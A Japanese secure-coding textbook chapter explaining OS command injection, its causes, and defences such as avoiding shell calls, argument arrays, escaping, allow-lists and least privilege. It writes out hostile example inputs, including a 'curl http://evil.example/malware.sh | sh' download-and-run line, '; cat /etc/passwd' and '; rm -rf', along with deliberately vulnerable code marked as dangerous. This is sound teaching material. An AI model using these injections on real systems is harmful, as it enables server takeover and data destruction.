# 安全なWebアプリケーションの作り方（第14章）

Webアプリは、画像変換・バックアップ・外部ツール連携などで **OS のコマンド** を呼び出すことがあります。第14章では、そのときに起きやすい **OSコマンド・インジェクション** と対策を解説します。

---

## 💻 OSコマンド・インジェクションの概要

**OSコマンド・インジェクション（OS Command Injection）** とは、外部から渡された文字列をそのまま OS のコマンドとして実行してしまい、**攻撃者が意図した別のコマンドまで動かされてしまう** 脆弱性です。

SQLインジェクションが「データベースへの命令」を注入するのに対し、こちらは **「OS（サーバー本体）への命令」** を注入する攻撃です。影響範囲がサーバー全体に及ぶため、非常に危険です。

| 項目 | 内容 |
|------|------|
| **分類** | インジェクション系脆弱性 |
| **インターフェース** | OS のシェル（コマンドライン） |
| **悪用手口** | シェルのメタ文字などを混ぜて、別コマンドを実行させる |

### 日常生活での例え

- **正常なコマンド実行**: 「この画像をリサイズして」と頼むと、その作業だけが行われる
- **攻撃された場合**: 「この画像をリサイズして。ついでに金庫の鍵も開けて」と書かれ、頼んでいない作業まで実行される

### なぜ危険か

Webアプリが OS コマンドを実行できるということは、**サーバー上でプログラムを動かす権限** を持っているということです。その権限が乗っ取られると、次のような被害が出ます。

```
・攻撃用ツールを外部からダウンロードされる
・ダウンロードしたツールに実行権限を与えられる
・OSの脆弱性を内部から攻撃され、管理者権限を奪われる
・Webサーバーが攻撃者の思いのままになる
```

一度サーバーを乗っ取られると、Webアプリの範囲を超えて、OS 全体が危険にさらされます。

---

## 💉 OSコマンド・インジェクションとは

### シェルとメタ文字（攻撃を読むために）

OS コマンドは、多くの場合 **シェル**（`bash` や `cmd.exe` など）経由で実行されます。シェルは、特別な意味を持つ文字（**メタ文字**）を解釈します。

| メタ文字（例） | 意味 |
|----------------|------|
| `;` | コマンドの区切り（前のコマンドのあとに別コマンドを実行） |
| `\|` | パイプ（前の結果を次のコマンドへ渡す） |
| `&` / `&&` | バックグラウンド実行 / 前が成功したら次を実行 |
| `` ` `` や `$()` | コマンド置換（中のコマンドを実行して結果を埋め込む） |
| `>` / `>>` | 出力のリダイレクト（ファイルへ書き込み） |
| 改行 | コマンドの区切りとして扱われることがある |

これらの文字が **エスケープ（無害化）されずに** コマンド文字列に入ると、攻撃者は「本来のコマンド」のあとに **自分のコマンドを追加** できます。

### 攻撃のイメージ

たとえば、ホスト名の疎通確認（ping）を行う機能が次のような URL だとします。

```
https://example.com/ping.php?host=example.com
```

アプリが `host` パラメータをそのままコマンドに連結している場合:

```
【正常な入力】
host=example.com
→ ping example.com を実行（想定どおり）

【攻撃者の入力】
host=example.com; cat /etc/passwd
→ ping example.com; cat /etc/passwd を実行
→ ping のあとに、パスワード関連ファイルの内容表示まで実行される
```

`;` は「ここでコマンドを区切る」という意味です。そのため、本来の `ping` のあとに、攻撃者が指定した別コマンドが動きます。

```
【別の攻撃例】
host=example.com && curl http://evil.example/malware.sh | sh
→ 外部から攻撃用スクリプトをダウンロードして実行する
```

### 攻撃の流れ

```
1. 攻撃者が「外部入力を OS コマンドに渡す」機能を見つける
2. ; や | などのメタ文字を含む値を送る
3. アプリが入力値をそのままコマンド文字列に連結する
4. シェルがメタ文字を解釈し、追加コマンドを実行する
5. ファイル閲覧・改ざん、外部通信、権限昇格などが起きる
```

## 🚨 何ができるか（被害）

OSコマンド・インジェクションが成功すると、Webアプリが動いているユーザー権限の範囲で、ほぼ何でもできます。

### サーバー乗っ取りまでの典型的な流れ

攻撃者は、いきなり管理者になるのではなく、段階的に権限を広げていくことが多いです。

| 段階 | 攻撃者がやること | 目的 |
|------|------------------|------|
| **1** | 攻撃用ツールを外部からダウンロード | 侵入後に使う道具を用意する |
| **2** | ダウンロードしたツールに実行権限を与える | ツールを動かせるようにする |
| **3** | OS の脆弱性を内部から攻撃する | 一般ユーザーから管理者権限へ昇格する |
| **4** | Webサーバーを完全に掌握する | 好きな操作をいつでもできるようにする |

```
【イメージ】

外部入力
  ↓
OSコマンド・インジェクション成功
  ↓
Webアプリの権限でコマンド実行できる
  ↓
攻撃ツールのダウンロード・実行
  ↓
OSの脆弱性を突いて管理者権限を取得
  ↓
サーバー全体が攻撃者の思いのまま
```

### 具体的な被害例

| 被害 | 説明 |
|------|------|
| **Webサーバー内のファイルの閲覧・改ざん・削除** | 設定ファイル、ソースコード、個人情報の漏洩や改ざん。サイトの破壊も可能 |
| **外部へのメールの送信** | 迷惑メールやなりすましメールの踏み台にされる |
| **別のサーバーへの攻撃** | 社内ネットワークや他サイトへの攻撃の起点（踏み台）になる |
| **暗号通貨の採掘** | サーバーの CPU / GPU を勝手に使われ、電気代や性能低下の被害が出る |

ファイルを読まれるだけでも危険ですが、書き込みや外部通信までできると、**自社サーバーが攻撃の拠点** になります。被害は自社サイトにとどまりません。

## 🔍 脆弱性が生まれる原因

次の条件がそろうと、OSコマンド・インジェクションが起きやすくなります。

| 原因 | 説明 |
|------|------|
| **シェルのメタ文字がエスケープされていない** | `;` `\|` `&` などがそのままコマンド文字列に入り、シェルに解釈される |
| **シェル機能を呼び出せる関数を使っている** | シェル経由でコマンドを実行する API を使っている |

### 原因1: シェルのメタ文字がエスケープされていない

外部入力をコマンド文字列に連結するとき、メタ文字を無害化していないと、入力が「データ」ではなく「命令」として扱われます。

```php
// ❌ 危険: 外部入力をそのままコマンドに連結
$host = $_GET['host'];
system("ping -c 1 " . $host);
```

```
入力: example.com; rm -rf /tmp/important
実行されるコマンド:
  ping -c 1 example.com; rm -rf /tmp/important
```

`example.com` はデータとして渡したつもりでも、`;` 以降は別コマンドとして実行されます。

### 原因2: シェル機能を呼び出せる関数を使っている

言語には、**シェル経由でコマンドを実行する関数** と、**シェルを介さず直接プログラムを起動する関数** があります。前者を使うと、メタ文字が解釈されやすく危険です。

| 言語 | シェル経由になりやすい例 | 比較的安全な方向性 |
|------|--------------------------|--------------------|
| **PHP** | `system()`, `exec()`, `shell_exec()`, `passthru()`, バッククォート | `proc_open()` で引数を配列渡し、など |
| **Perl** | `system("cmd $input")`、`open(PIPE, "\| cmd $input")` | `system(@args)`、`sysopen`、リスト形式の呼び出し |
| **Python** | `os.system()`, `subprocess` の `shell=True` | `subprocess.run([...], shell=False)` |
| **Ruby** | `` `cmd` ``、`system("cmd #{input}")` | `system("cmd", arg1, arg2)` のように引数分離 |

ポイントは、**「1本の文字列としてシェルに渡す」か「コマンドと引数を分けて渡す」か** です。文字列で渡すとシェルがメタ文字を解釈します。

```
❌ 危険（シェルが解釈する）
  "ping -c 1 " + userInput
  → シェルが ; や | を命令として扱う

✅ 安全寄り（引数として渡す）
  ["ping", "-c", "1", userInput]
  → userInput は「ただの文字列」として扱われやすい
```

## 🛡️ OSコマンド・インジェクションの対策

対策は、優先度の高いものから順に考えます。

```
【対策の優先順位】

1. OSコマンド呼び出し自体を使わない
2. シェル経由の関数を使わない
3. 外部入力をコマンドのパラメータに渡さない
4. どうしても渡すなら、安全な方法でエスケープ / 検証する
5. 被害を抑える（権限最小化・パッチ適用）
```

最も安全なのは **「そもそも OS コマンドを呼ばない」** ことです。エスケープは最後の手段に近い位置づけです。

---

### 1. OSコマンド呼び出しを使わない実装方法を選択する

同じ機能でも、OS コマンドを使わずに実現できることがよくあります。

| やりたいこと | OSコマンドに頼りがちな例 | コマンドを使わない例 |
|--------------|--------------------------|----------------------|
| **画像のリサイズ** | `convert`（ImageMagick）を `system` で呼ぶ | 画像処理ライブラリ（GD、Imagick 拡張など）を API として使う |
| **PDF の生成** | 外部コマンドで変換 | 言語用の PDF ライブラリを使う |
| **ファイル操作** | `rm` `cp` `cat` を実行 | 言語標準のファイル API を使う |
| **疎通確認** | `ping` を実行 | そもそもユーザー向けに公開しない / 専用ライブラリを使う |

```php
// ❌ 危険: OS コマンドでファイルを読む
system("cat " . $filename);

// ✅ 良い例: 言語のファイル API を使う
$content = file_get_contents($filename);
```

ライブラリや言語標準機能で足りるなら、**OS コマンド呼び出しは避ける** のが第一選択です。

---

### 2. シェル呼び出し機能のある関数の利用を避ける

どうしても外部プログラムを起動する場合は、**シェルを介さない呼び出し方** を選びます。

```php
// ❌ 危険: シェル経由（メタ文字が解釈される）
$host = $_GET['host'];
system("ping -c 1 " . $host);

// ✅ 良い例の方向性: 引数を分離して渡す（シェルを介さない）
// PHP では proc_open などで引数配列を渡す方法がある
$cmd = ['ping', '-c', '1', $host];
// $host は「ping の引数」として扱われ、; はただの文字になる
```

```python
# ❌ 危険
os.system("ping -c 1 " + host)
subprocess.run("ping -c 1 " + host, shell=True)

# ✅ 良い例: shell=False（デフォルト）でリスト渡し
subprocess.run(["ping", "-c", "1", host], shell=False)
```

シェルを介さない場合、`;` や `|` は「コマンドの区切り」ではなく、**ファイル名やホスト名の一部というただの文字** として渡されます。

#### Perl の場合: `open` の代わりに `sysopen` を使う

Perl では、`open` の使い方によってシェルが起動することがあります。ファイルを開くだけなら、**`sysopen`** や **モードを明示した `open`** を使います。

```perl
# ❌ 危険になりやすい: ファイル名にメタ文字が含まれるとシェルが動くことがある
open(my $fh, $filename);

# ✅ 良い例: sysopen でファイルを開く（シェルを介さない）
use Fcntl qw(O_RDONLY);
sysopen(my $fh, $filename, O_RDONLY) or die $!;

# ✅ 良い例: open でもモードを明示する（3引数形式）
open(my $fh, '<', $filename) or die $!;
```

| 書き方 | 安全性 | 説明 |
|--------|--------|------|
| **`open(FH, $filename)`** | 危険になりやすい | ファイル名の内容次第でパイプやシェルが動くことがある |
| **`open(FH, '<', $filename)`** | 安全寄り | 読み取りモードを明示し、ファイルとして開く |
| **`sysopen`** | 安全寄り | 低レベルなファイルオープン。シェルを介さない |

「ファイルを開きたいだけなのに、気づかないうちにコマンド実行できてしまう」のが典型的な落とし穴です。**意図がファイルオープンなら、コマンド実行経路のない API を使う** のがポイントです。

---

### 3. 外部から入力された文字列をコマンドラインのパラメータに渡さない

シェルを介さない呼び出しでも、外部入力をコマンドの引数に渡すと、別の問題が起きることがあります（想定外のオプション指定など）。

最も安全なのは、**外部入力をコマンドラインに一切渡さない** ことです。

```
❌ 悪い例
  /convert.php?file=user_upload.png
  → ユーザーが指定したファイル名をそのままコマンド引数にする

✅ 良い例
  /convert.php?id=123
  → ID だけ受け取り、サーバー側で実ファイルパスや処理内容を決める
```

| 方針 | 説明 |
|------|------|
| **ID で管理する** | DB に「ID ↔ 実データ」を持ち、外部には ID だけ渡す |
| **サーバー側で固定する** | 実行するコマンドや引数をアプリが決め打ちする |
| **許可リスト（ホワイトリスト）** | 「small」「large」など、決まった値だけ受け付ける |

```php
// ✅ 良い例: 外部入力は ID のみ。コマンド引数はサーバー側で決める
$id = (int)($_GET['id'] ?? 0);

// DB から許可されたファイルパスを取得（ユーザー入力そのものではない）
$path = findAllowedPathById($id);
if ($path === null) {
    exit('不正な指定です');
}

// どうしても外部コマンドが必要なら、サーバーが決めたパスだけ渡す
// ※ 可能ならライブラリ利用に置き換える
```

---

### 4. OSコマンドに渡すパラメータを安全な関数によりエスケープする

やむを得ず外部入力をコマンドに渡す場合は、**その言語・環境向けの安全なエスケープ関数** を使います。自分で `;` を消すだけ、といった独自処理は漏れやすく危険です。

| 言語 | エスケープの例 |
|------|----------------|
| **PHP** | `escapeshellarg()`（引数用）、`escapeshellcmd()`（コマンド用 ※用途に注意） |
| **Perl** | `String::ShellQuote` など |
| **Python** | そもそも `shell=False` + リスト渡しを優先。文字列結合しない |

```php
// どうしてもシェル経由が必要な場合の例（最終手段）
$host = $_GET['host'] ?? '';

// 引数として安全にクォートする
$safeHost = escapeshellarg($host);
system("ping -c 1 " . $safeHost);
```

ただし、エスケープは **ミスや関数の誤用が起きやすい** です。可能なら「コマンドを使わない」「シェルを介さない」「外部入力を渡さない」を優先してください。

#### パラメータをシェルの環境変数経由で渡す

別の安全寄りの方法として、**値をコマンドライン引数ではなく環境変数で渡し、スクリプト側で参照する** やり方があります。

```
【考え方】

❌ コマンドラインに直接埋め込む
  system("process.sh " . $userInput);
  → メタ文字がコマンド文字列に混ざる

✅ 環境変数経由で渡す
  環境変数 VALUE=$userInput を設定
  system("process.sh");  ※ 引数にはユーザー入力を付けない
  process.sh の中で $VALUE を参照
```

コマンドライン文字列にユーザー入力が現れないため、シェルのメタ文字解釈を避けやすくなります。ただし、呼び出し方やスクリプト側の扱いを誤ると別の問題になるため、**「引数を分離して渡す」「そもそもコマンドを使わない」** の方が分かりやすく安全です。

---

### 5. パラメータの検証

エスケープとあわせて、**受け付ける値の形式を厳しく制限** します。

```php
// ✅ ホスト名として許される文字だけ通す（例）
$host = $_GET['host'] ?? '';

if (!preg_match('/\A[a-zA-Z0-9.-]+\z/', $host)) {
    exit('不正なホスト名です');
}

// 長さ制限もあるとよい
if (strlen($host) > 253) {
    exit('不正なホスト名です');
}
```

| 検証の例 | 効果 |
|----------|------|
| **英数字と一部記号だけ許可** | `;` `\|` `&` などをそもそも受け付けない |
| **長さ制限** | 異常に長い入力を拒否する |
| **許可リスト** | 決まった選択肢以外を拒否する |

許可リスト（「A か B か C だけ」）が使えるなら、それが最も分かりやすく安全です。

---

### 6. 被害を抑える対策（多層防御）

インジェクション自体を防ぐのが本筋ですが、万一突破されたときの被害を小さくする対策も重要です。

#### アプリケーションの稼働するユーザー権限を最小限にする

Webアプリは、**必要最小限の権限の OS ユーザー** で動かします。

```
❌ 悪い例
  root（管理者）権限で Web アプリを動かす
  → 侵入された瞬間にサーバー全体を掌握される

✅ 良い例
  専用の低権限ユーザー（例: www-data）で動かす
  → できる操作が限られ、被害が広がいにくい
```

| 方針 | 説明 |
|------|------|
| **管理者権限で動かさない** | root / Administrator での常時稼働を避ける |
| **書き込み先を限定する** | アプリが触れるディレクトリを最小にする |
| **不要なコマンドを使えないようにする** | OS 側の権限や実行ファイルの制限 |

権限が低いと、「管理者権限の奪取」までには追加の攻撃が必要になり、防御の時間を稼げます。

#### Webサーバーの OS やミドルウェアのパッチ適用

攻撃者は、侵入後に **OS やミドルウェアの既知の脆弱性** を使って権限昇格することがあります。パッチを当てておくと、その道を塞げます。

| 対象 | なぜ必要か |
|------|------------|
| **OS** | カーネルや標準コマンドの脆弱性を塞ぐ |
| **Webサーバー** | Apache / Nginx などの既知の穴を塞ぐ |
| **言語ランタイム** | PHP / Python / Perl などの更新 |
| **ライブラリ・外部ツール** | ImageMagick など、コマンド連携で使いがちな部品 |

```
【多層防御のイメージ】

第1層: OSコマンドを使わない / シェルを介さない / 入力を渡さない
第2層: エスケープとパラメータ検証
第3層: 最小権限でアプリを動かす
第4層: OS・ミドルウェアのパッチ適用
```

どれか1つだけでは不十分です。**侵入しにくくする対策** と **侵入されても被害を抑える対策** の両方を積みます。

## 📋 まとめ

| 項目 | 要点 |
|------|------|
| **何が起きるか** | 外部入力が OS コマンドとして実行され、サーバーを乗っ取られる |
| **主な被害** | ファイルの閲覧・改ざん・削除、迷惑メール、他サーバーへの攻撃、暗号通貨採掘 |
| **原因** | シェルのメタ文字がエスケープされていない / シェル経由の関数を使っている |
| **最良の対策** | OSコマンド呼び出し自体を使わない |
| **次善の対策** | シェルを介さない / 外部入力をコマンドに渡さない |
| **やむを得ない場合** | 安全なエスケープ関数・環境変数経由・許可リスト検証 |
| **被害軽減** | 最小権限での稼働、OS・ミドルウェアのパッチ適用 |

1. できるなら OS コマンドを呼ばない（ライブラリや言語標準機能を使う）
2. 呼ぶならシェルを介さない（コマンドと引数を分離する）
3. 外部入力をコマンドラインに渡さない（ID 管理・許可リスト）
4. どうしても渡すなら、安全な関数でエスケープし、形式を厳しく検証する
5. アプリは最小権限で動かし、OS やミドルウェアは最新に保つ
